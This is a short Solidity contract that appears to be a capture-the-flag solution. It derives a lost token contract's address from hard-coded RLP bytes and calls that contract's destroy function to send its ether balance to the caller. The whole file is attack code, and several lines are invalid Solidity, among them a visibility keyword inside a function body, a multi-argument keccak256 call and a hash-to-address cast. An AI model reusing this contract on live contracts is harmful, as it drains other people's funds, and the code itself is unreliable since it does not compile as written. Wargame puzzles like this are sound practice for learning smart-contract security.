pragma solidity ^0.6.0;


interface SimpleToken {
    function destroy(address payable _to) external;
}

contract Destroy{
    address payable receiver = msg.sender;
    SimpleToken killMeplease;

    function getAddress() private returns (address) {
        address public a = address(keccak256(0xd6, 0x94, 0x7C974B5b1f7A9780dD350F3Feb8901bD216f39FC, 0x01));
        return a;
    }
    
    function destroySimpleToken(address payable simpleTokenAddress) public {
        killMeplease = SimpleToken(simpleTokenAddress);
        killMeplease.destroy(receiver);
    }
}
